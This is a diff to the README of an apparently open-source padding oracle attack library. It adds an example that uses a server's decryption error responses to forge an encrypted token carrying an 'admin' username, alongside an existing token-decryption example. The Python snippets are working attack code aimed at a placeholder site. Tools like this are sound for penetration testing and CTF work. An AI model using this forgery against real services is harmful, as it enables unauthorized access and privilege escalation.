@@ -29,7 +29,9 @@ Performance of padding_oracle.py was evaluated using [0x09] Cathub Party from ED
 | 16              | 1m 20s         |
 | 64              | 56s            |
 
-## How to Use 
+## How to Use
+
+### Decryption
 
 To illustrate the usage, consider an example of testing `https://vulnerable.website/api/?token=M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94%3D`:
 
@@ -61,6 +63,38 @@ plaintext = padding_oracle(
     block_size = 16,
     oracle = oracle,
     num_threads = 16,
+)
+```
+
+### Encryption
+
+To illustrate the usage, consider an example of forging a token for `https://vulnerable.website/api/?token=<.....>` :
+
+```python
+from padding_oracle import padding_oracle, base64_encode, base64_decode
+import requests
+
+sess = requests.Session() # use connection pool
+url = 'https://vulnerable.website/api/'
+
+def oracle(ciphertext: bytes):
+    resp = sess.get(url, params={'token': base64_encode(ciphertext)})
+
+    if 'failed' in resp.text:
+        return False # e.g. token decryption failed
+    elif 'success' in resp.text:
+        return True
+    else:
+        raise RuntimeError('unexpected behavior')
+
+payload: bytes =b"{'username':'admin'}"
+
+ciphertext = padding_oracle(
+    payload,
+    block_size = 16,
+    oracle = oracle,
+    num_threads = 16,
+    mode = 'encrypt'
 )
 ```
 
